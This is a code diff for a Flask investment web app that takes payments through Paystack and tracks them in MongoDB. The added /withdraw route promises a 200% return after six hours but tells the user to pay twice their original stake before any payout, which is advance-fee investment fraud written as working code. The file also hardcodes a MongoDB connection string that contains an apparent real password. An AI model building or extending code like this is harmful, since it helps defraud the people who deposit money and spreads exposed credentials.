@@ -4,7 +4,7 @@ import requests
 from flask import Flask, render_template, request, redirect, session, url_for, jsonify
 from werkzeug.utils import secure_filename
 from werkzeug.security import generate_password_hash, check_password_hash
-
+from datetime import datetime, timedelta
 # Hardcoded Configuration (Directly inside the script)
 MONGO_URI = "mongodb+srv://iconichean:EDrWdX9G3pPeLll1@cluster0.n3rva.mongodb.net/"
 FLASK_SECRET_KEY = "your_secure_flask_secret_key"
@@ -80,18 +80,13 @@ def login():
     return render_template("login.html")
 
 ### ✅ Dashboard Route
-@app.route("/dashboard", methods=["GET"])
+@app.route("/dashboard")
 def dashboard():
-    if "user" in session:
-        print(f"Debugging: Paystack Public Key -> {PAYSTACK_PUBLIC_KEY}")
-        print(f"Debugging: Paystack Secret Key -> {PAYSTACK_SECRET_KEY}")
-        return render_template(
-            "dashboard.html",
-            user=session["user"],
-            profile_picture=session.get("profile_picture", "default.jpg"),
-            paystack_key=PAYSTACK_PUBLIC_KEY
-        )
-    return redirect(url_for("login"))
+    if "user_email" in session:
+        user = users_collection.find_one({"email": session["user_email"]})
+        session["investment"] = user.get("investment", "No active investment")
+
+    return render_template("dashboard.html", session=session)
 
 
 
@@ -171,7 +166,6 @@ def logout():
 @app.route("/terms")
 def terms():
     return render_template("terms.html")
-
 @app.route("/initialize_transaction", methods=["POST"])
 def initialize_transaction():
     data = request.json
@@ -186,11 +180,77 @@ def initialize_transaction():
     payload = {
         "email": email,
         "amount": int(amount_kes * 100),  # Convert KES to kobo format
-        "currency": "KES"
+        "currency": "KES",
+        "callback_url": url_for('paystack_callback', _external=True)  # Redirect after payment
     }
 
     response = requests.post("https://api.paystack.co/transaction/initialize", headers=headers, json=payload)
+    
+    # Store investment timestamp in database
+    if response.json()["status"]:
+        users_collection.update_one({"email": email}, {
+            "$set": {
+                "investment": amount_kes,
+                "investment_time": datetime.utcnow()  # Track time of investment
+            }
+        })
+
     return jsonify(response.json())  # Send Paystack response to frontend
+@app.route("/withdraw", methods=["POST"])
+def withdraw():
+    if "user_email" not in session:
+        return jsonify({"error": "User not logged in!"}), 401
+
+    user = users_collection.find_one({"email": session["user_email"]})
+
+    if not user or "investment_time" not in user:
+        return jsonify({"error": "No active investment!"}), 400
+
+    # Check if 6 hours have passed
+    investment_time = user["investment_time"]
+    current_time = datetime.utcnow()
+    time_diff = current_time - investment_time
+
+    if time_diff < timedelta(hours=6):
+        remaining_time = (timedelta(hours=6) - time_diff).seconds // 3600
+        return jsonify({"error": f"Investment not matured! Wait {remaining_time} hours."}), 403
+
+    # Calculate payout amount
+    initial_amount = user["investment"]
+    profit_amount = initial_amount * 2  # 200% profit
+    required_payment = initial_amount * 2  # User must pay 200% of initial investment
+
+    return jsonify({
+        "success": True,
+        "message": f"To receive {profit_amount}, you must pay {required_payment} first.",
+        "required_payment": required_payment
+    })
+
+@app.route('/paystack_callback', methods=['GET'])
+def paystack_callback():
+    reference = request.args.get('reference')
+
+    if not reference:
+        return "Payment reference missing!", 400
+
+    headers = {"Authorization": f"Bearer {PAYSTACK_SECRET_KEY}"}
+    response = requests.get(f"https://api.paystack.co/transaction/verify/{reference}", headers=headers)
+    data = response.json()
+
+    if data["status"] and data["data"]["status"] == "success":
+        user_email = data["data"]["customer"]["email"]
+        amount_paid = data["data"]["amount"] / 100  # Convert kobo to currency
+        
+        # Update investment status in MongoDB
+        users_collection.update_one({"email": user_email}, {"$set": {"investment": f"${amount_paid} invested"}})
+
+        # Refresh session so the dashboard reflects changes
+        session["investment"] = f"${amount_paid} invested"
+
+        return redirect(url_for("dashboard"))  # Redirect back to dashboard
+
+    return "Payment verification failed!", 400
+
 
 
 if __name__ == "__main__":
